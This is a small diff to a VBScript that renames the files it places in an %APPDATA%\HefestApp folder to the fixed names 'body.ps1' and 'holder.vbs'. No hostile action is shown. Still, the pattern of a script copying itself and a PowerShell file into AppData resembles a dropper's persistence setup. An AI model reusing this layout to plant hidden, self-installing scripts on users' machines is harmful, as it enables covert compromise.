@@ -60,7 +60,7 @@ Function GetPS1FilePath()
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
     destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
-    destPath = fso.BuildPath(destFolder, fso.GetFileName(Left(scriptPath, Len(scriptPath) - 3) & "ps1"))
+    destPath = fso.BuildPath(destFolder, "body.ps1")
     CreateFolder fso, destFolder
     GetPS1FilePath = destPath   
 End Function
@@ -71,7 +71,7 @@ Function GetSelfFilePath()
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
     destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
-    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
+    destPath = fso.BuildPath(destFolder, "holder.vbs")
     CreateFolder fso, destFolder
     GetSelfFilePath = destPath
 End Function
